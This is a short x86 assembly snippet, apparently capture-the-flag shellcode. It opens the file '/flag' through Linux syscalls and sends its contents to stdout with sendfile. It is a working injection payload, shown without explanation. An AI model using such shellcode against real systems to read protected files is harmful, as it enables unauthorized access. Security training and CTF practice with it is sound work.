xor eax, eax
mov al, 0x67
push eax
push 0x616c662f
push esp

xor ecx, ecx 
mov ebx, [ESP + 0] 
mov eax, 0x5
int 0x80 ; Syscall
add ESP, 12

mov esi, 0xc8
xor edx, edx 
mov ecx, 0x3
mov ebx, 0x1
mov eax, 0xbb
int 0x80 ; Syscall

